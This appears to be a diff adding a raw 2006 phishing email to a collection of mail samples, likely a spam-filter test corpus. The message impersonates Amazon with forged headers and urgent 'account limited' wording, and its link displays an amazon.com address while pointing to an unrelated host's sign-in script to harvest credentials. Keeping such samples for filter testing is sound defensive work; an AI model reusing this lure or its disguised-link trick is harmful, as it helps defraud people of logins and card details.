@@ -1,0 +1,66 @@
+From nobody Sun Jan 25 13:50:00 2015
+Return-Path: <service@amazon.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 63E8A4692D
+ for <user@login.example.com>; Mon,  9 Oct 2006 14:05:39 -0400 (EDT)
+Received: from wiltec.info (ns1.wildanger.hostfire.de [62.141.58.56])
+ by mail.example.org (Postfix) with ESMTP id 309FE6CD2AB
+ for <user@example.com>; Mon,  9 Oct 2006 14:05:38 -0400 (EDT)
+Received: from User (mail2.bostonati.com [67.153.124.202])
+ (authenticated bits=0)
+ by wiltec.info (8.12.11.20060308/8.12.11) with ESMTP id k99HmLRM030093;
+ Mon, 9 Oct 2006 19:48:23 +0200
+Message-Id: <200610091748.k99HmLRM030093@wiltec.info>
+From: "Amazon.com"<service@amazon.com>
+Subject: Amazon.com - Important Notice
+Date: Mon, 9 Oct 2006 20:52:28 +0300
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+To: undisclosed-recipients:;
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 406
+
+<html><head><title>Amazon.com</title></head><body>
+<TABLE cellSpacing=8 cellPadding=0 width="98%" border=0>
+  <TR>
+    <TD vAlign=top align=left width="43%"><b>&nbsp;</b><p><b>&nbsp;&nbsp; We are 
+    contacting you to inform that our Account Review Team identified some 
+    unusual activity in your account. In accordance with Amazon's User Agreement 
+    and to ensure that your account has not been compromised, access to your 
+    account was limited. Your account access will remain limited until this 
+    issue has been resolved.<br>
+&nbsp;&nbsp;&nbsp; To secure your account and quickly restore full access we may 
+    require some additional information from you from the following reason:<br>
+&nbsp;&nbsp; We have been notified that a card associated with your account has 
+    been reported as stolen, or that there were additional problems with your 
+    card.<br>
+&nbsp;&nbsp;&nbsp; This process is mandatory, and if not completed within the 
+    nearest time your account or credit card may be subject for temporary 
+    suspension.<br>
+&nbsp;&nbsp;&nbsp; To securely confirm your Amazon information please click on 
+    the link bellow:</b><br>
+<br>
+<b>
+<a href="http://acsl.demon.nl/%20%20/amazon/exec.php?cmd=sign-in">
+https://www.amazon.com/cgi-bin/webscr?cmd=LOGIN</a><br>
+<br>
+<b>&nbsp;&nbsp;&nbsp; We encourage you to log in and perform the steps necessary 
+    to restore your account access as soon as possible. Allowing your account 
+    access to remain limited for an extended period of time may result in 
+    further limitations on the use of your account and possible account closure.<br>
+&nbsp;&nbsp;&nbsp; For more information about how to protect your account please 
+    visit  </b>Amazon Security Center. We apologize for any inconvenience this may 
+    cause.</p>
+    <p><BR></TD></TR>
+  </TABLE>
+</body></html>
